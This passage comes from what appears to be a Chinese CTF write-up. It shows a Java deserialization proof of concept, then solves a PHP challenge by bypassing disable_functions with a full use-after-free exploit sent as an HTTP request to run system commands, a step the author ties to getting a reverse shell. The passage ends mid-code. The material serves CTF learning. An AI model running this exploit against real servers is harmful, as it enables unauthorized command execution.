<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream out)</span> <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">    out.defaultWriteObject();</span><br><span class="line">    out.writeObject(<span class="built_in">this</span>.height);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后序列化传入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasePoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>((String) <span class="string">&quot;m4n_q1u_666&quot;</span>, (String) <span class="string">&quot;666&quot;</span>, (String) <span class="string">&quot;180&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        oos.writeObject(user);</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line"></span><br><span class="line">        <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> (User) SerAndDe.deserialize(bytes);</span><br><span class="line">        System.out.println(user2.toString());</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有个小细节，为了让对象在服务端顺利反序列化，该对象的类里开头的<code>package</code>语句，也就是位置需要和服务端一致。</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317003858-r22uayy.png" alt="image.png"></p>
<h1 id="interesting-php"><a href="#interesting-php" class="headerlink" title="interesting php"></a>interesting php</h1><h2 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h2><p>考点为bypass disable_functions和提权</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>尝试发现ban了许多函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>));<span class="comment">//读目录</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">ini_get_all</span>());<span class="comment">//读php.ini</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p>disable_functions:</p>
<p>include,include_once,require,require_once,stream_get_contents,fwrite,readfile,file_get_contents,fread,fgets,fgetss,file,parse_ini_file,show_source,fsockopen,proc_open,ini_set,pfsockopen,ini_alter,ini_get,posix_kill,phpinfo,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,passthru,symlink,link,syslog,imap_open,dl,mail,stream_socket_client,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,get_cfg_var</p>
</blockquote>
<p>很明显的<code>file_put_contents</code>和<code>fputs</code>没ban</p>
<h2 id="bypass-disable-functions"><a href="#bypass-disable-functions" class="headerlink" title="bypass disable_functions"></a>bypass disable_functions</h2><p>使用这个项目：<a href="https://github.com/mm0r1/exploits/tree/master/php-filter-bypass">https://github.com/mm0r1/exploits/tree/master/php-filter-bypass</a></p>
<p>需要注意的是：</p>
<ul>
<li>Content-Type: multipart&#x2F;form-data; boundary&#x3D;—-WebKitFormBoundarytTUJ5AxeIGFMSfxf</li>
<li>——WebKitFormBoundarytTUJ5AxeIGFMSfxf<br>Content-Disposition: form-data; name&#x3D;”1”</li>
</ul>
<p>这两处，然后就可以反弹shell</p>
<p><a href="https://www.jianshu.com/p/29e38bcc8a1d">深入解析 multipart&#x2F;form-data</a></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?exp=eval($_POST[1]);</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>dc223a6d-b30e-42bf-be3d-38a282766ca7.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6889</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://dc223a6d-b30e-42bf-be3d-38a282766ca7.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarytTUJ5AxeIGFMSfxf</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://dc223a6d-b30e-42bf-be3d-38a282766ca7.node4.buuoj.cn:81/?exp=eval($_POST[1]);</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=17eec4fcc66536-0975948f3634ff-576153e-154ac4-17eec4fcc67914</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundarytTUJ5AxeIGFMSfxf</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">pwn</span>(<span class="string">&#x27;whoami&#x27;</span>);</span></span><br><span class="line"><span class="language-php"><span class="comment">#pwn($_POST[1]);</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;LOGGING&#x27;</span>, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;CHUNK_DATA_SIZE&#x27;</span>, <span class="number">0x60</span>);</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;CHUNK_SIZE&#x27;</span>, ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + <span class="number">0x20</span> : CHUNK_DATA_SIZE);</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;FILTER_SIZE&#x27;</span>, ZEND_DEBUG_BUILD ? <span class="number">0x70</span> : <span class="number">0x50</span>);</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;STRING_SIZE&#x27;</span>, CHUNK_DATA_SIZE - <span class="number">0x18</span> - <span class="number">1</span>);</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;CMD&#x27;</span>, <span class="variable">$cmd</span>);</span></span><br><span class="line"><span class="language-php">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$groom</span>[] = <span class="title class_">Pwn</span>::<span class="title function_ invoke__">alloc</span>(STRING_SIZE);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">stream_filter_register</span>(<span class="string">&#x27;pwn_filter&#x27;</span>, <span class="string">&#x27;Pwn&#x27;</span>);</span></span><br><span class="line"><span class="language-php">    <span class="variable">$fd</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fd</span>,<span class="string">&#x27;pwn_filter&#x27;</span>);</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">fputs</span>(<span class="variable">$fd</span>, <span class="string">&#x27;x&#x27;</span>);</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>; &#125;</span></span><br><span class="line"><span class="language-php"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span> <span class="keyword">extends</span> <span class="title">php_user_filter</span> </span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="variable">$abc</span>, <span class="variable">$abc_addr</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="variable">$helper</span>, <span class="variable">$helper_addr</span>, <span class="variable">$helper_off</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="variable">$uafp</span>, <span class="variable">$hfp</span>;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$in</span>, <span class="variable">$out</span>, &amp;<span class="variable">$consumed</span>, <span class="variable">$closing</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span>(<span class="variable">$closing</span>) <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">stream_bucket_make_writeable</span>(<span class="variable">$in</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;filtername = <span class="title class_">Pwn</span>::<span class="title function_ invoke__">alloc</span>(STRING_SIZE);</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$this</span>-&gt;stream);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">go</span>();</span></span><br><span class="line"><span class="language-php">        <span class="keyword">return</span> PSFS_PASS_ON;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;abc = &amp;<span class="variable language_">$this</span>-&gt;filtername;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">make_uaf_obj</span>();</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;helper = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;helper-&gt;b = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;&#125;;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;helper_addr = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(CHUNK_SIZE * <span class="number">2</span> - <span class="number">0x18</span>) - CHUNK_SIZE * <span class="number">2</span>;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;helper @ 0x%x&quot;</span>, <span class="variable">$this</span>-&gt;helper_addr);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;abc_addr = <span class="variable language_">$this</span>-&gt;helper_addr - CHUNK_SIZE;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;abc @ 0x%x&quot;</span>, <span class="variable">$this</span>-&gt;abc_addr);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;helper_off = <span class="variable language_">$this</span>-&gt;helper_addr - <span class="variable language_">$this</span>-&gt;abc_addr - <span class="number">0x18</span>;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$helper_handlers</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(CHUNK_SIZE);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;helper handlers @ 0x%x&quot;</span>, <span class="variable">$helper_handlers</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">prepare_leaker</span>();</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$binary_leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$helper_handlers</span> + <span class="number">8</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;binary leak @ 0x%x&quot;</span>, <span class="variable">$binary_leak</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">prepare_cleanup</span>(<span class="variable">$binary_leak</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$closure_addr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;helper_off + <span class="number">0x38</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;real closure @ 0x%x&quot;</span>, <span class="variable">$closure_addr</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$closure_ce</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$closure_addr</span> + <span class="number">0x10</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;closure class_entry @ 0x%x&quot;</span>, <span class="variable">$closure_ce</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$basic_funcs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$closure_ce</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;basic_functions @ 0x%x&quot;</span>, <span class="variable">$basic_funcs</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$zif_system</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;zif_system @ 0x%x&quot;</span>, <span class="variable">$zif_system</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$fake_closure_off</span> = <span class="variable language_">$this</span>-&gt;helper_off + CHUNK_SIZE * <span class="number">2</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x138</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$fake_closure_off</span> + <span class="variable">$i</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$closure_addr</span> + <span class="variable">$i</span>));</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$fake_closure_off</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$handler_offset</span> = PHP_MAJOR_VERSION === <span class="number">8</span> ? <span class="number">0x70</span> : <span class="number">0x68</span>;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$fake_closure_off</span> + <span class="variable">$handler_offset</span>, <span class="variable">$zif_system</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$fake_closure_addr</span> = <span class="variable language_">$this</span>-&gt;helper_addr + <span class="variable">$fake_closure_off</span> - <span class="variable language_">$this</span>-&gt;helper_off;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;helper_off + <span class="number">0x38</span>, <span class="variable">$fake_closure_addr</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;fake closure @ 0x%x&quot;</span>, <span class="variable">$fake_closure_addr</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cleanup</span>();</span></span><br><span class="line"><span class="language-php">        (<span class="variable language_">$this</span>-&gt;helper-&gt;b)(CMD);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">make_uaf_obj</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;uafp = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">fputs</span>(<span class="variable">$this</span>-&gt;uafp, <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;QQQ&#x27;</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0xDEADBAADC0DE</span>));</span></span><br><span class="line"><span class="language-php">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; STRING_SIZE; <span class="variable">$i</span>++) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="title function_ invoke__">fputs</span>(<span class="variable">$this</span>-&gt;uafp, <span class="string">&quot;\x00&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare_leaker</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$str_off</span> = <span class="variable language_">$this</span>-&gt;helper_off + CHUNK_SIZE + <span class="number">8</span>;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$str_off</span>, <span class="number">2</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$str_off</span> + <span class="number">0x10</span>, <span class="number">6</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$val_off</span> = <span class="variable language_">$this</span>-&gt;helper_off + <span class="number">0x48</span>;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$val_off</span>, <span class="variable">$this</span>-&gt;helper_addr + CHUNK_SIZE + <span class="number">8</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$val_off</span> + <span class="number">8</span>, <span class="number">0xA</span>);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare_cleanup</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$ret_gadget</span> = <span class="variable">$binary_leak</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">do</span> &#123;</span></span><br><span class="line"><span class="language-php">            --<span class="variable">$ret_gadget</span>;</span></span><br><span class="line"><span class="language-php">        &#125; <span class="keyword">while</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$ret_gadget</span>, <span class="number">1</span>) !== <span class="number">0xC3</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;ret gadget = 0x%x&quot;</span>, <span class="variable">$ret_gadget</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">0</span>, <span class="variable">$this</span>-&gt;abc_addr + <span class="number">0x20</span> - (PHP_MAJOR_VERSION === <span class="number">8</span> ? <span class="number">0x50</span> : <span class="number">0x60</span>));</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">8</span>, <span class="variable">$ret_gadget</span>);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;helper_off + CHUNK_SIZE + <span class="number">16</span>, <span class="variable">$addr</span> - <span class="number">0x10</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable">$value</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;helper-&gt;c);</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span>(<span class="variable">$n</span> !== <span class="number">8</span>) &#123; <span class="variable">$value</span> &amp;= (<span class="number">1</span> &lt;&lt; (<span class="variable">$n</span> &lt;&lt; <span class="number">3</span>)) - <span class="number">1</span>; &#125;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">return</span> <span class="variable">$value</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="variable language_">$this</span>-&gt;abc[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span></span><br><span class="line"><span class="language-php">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$addr</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="comment">// In rare instances the standard module might lie after the addr we&#x27;re starting</span></span></span><br><span class="line"><span class="language-php">            <span class="comment">// the search from. This will result in a SIGSGV when the search reaches an unmapped page.</span></span></span><br><span class="line"><span class="language-php">            <span class="comment">// In that case, changing the direction of the search should fix the crash.</span></span></span><br><span class="line"><span class="language-php">            <span class="comment">// $addr += 0x10;</span></span></span><br><span class="line"><span class="language-php">            <span class="variable">$addr</span> -= <span class="number">0x10</span>;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span>, <span class="number">4</span>) === <span class="number">0xA8</span> &amp;&amp;</span></span><br><span class="line"><span class="language-php">                <span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span> + <span class="number">4</span>, <span class="number">4</span>),</span></span><br><span class="line"><span class="language-php">                    [<span class="number">20151012</span>, <span class="number">20160303</span>, <span class="number">20170718</span>, <span class="number">20180731</span>, <span class="number">20190902</span>, <span class="number">20200930</span>])) &#123;</span></span><br><span class="line"><span class="language-php">                <span class="variable">$module_name_addr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span> + <span class="number">0x20</span>);</span></span><br><span class="line"><span class="language-php">                <span class="variable">$module_name</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$module_name_addr</span>);</span></span><br><span class="line"><span class="language-php">                <span class="keyword">if</span>(<span class="variable">$module_name</span> === <span class="number">0x647261646e617473</span>) &#123;</span></span><br><span class="line"><span class="language-php">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;standard module @ 0x%x&quot;</span>, <span class="variable">$addr</span>);</span></span><br><span class="line"><span class="language-php">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span> + <span class="number">0x28</span>);</span></span><br><span class="line"><span class="language-php">                &#125;</span></span><br><span class="line"><span class="language-php">            &#125;</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">do</span> &#123;</span></span><br><span class="line"><span class="language-php">            <span class="variable">$f_entry</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span>);</span></span><br><span class="line"><span class="language-php">            <span class="variable">$f_name</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$f_entry</span>, <span class="number">6</span>);</span></span><br><span class="line"><span class="language-php">            <span class="keyword">if</span>(<span class="variable">$f_name</span> === <span class="number">0x6d6574737973</span>) &#123;</span></span><br><span class="line"><span class="language-php">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span></span><br><span class="line"><span class="language-php">            &#125;</span></span><br><span class="line"><span class="language-php">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span></span><br><span class="line"><span class="language-php">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> !== <span class="number">0</span>);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span 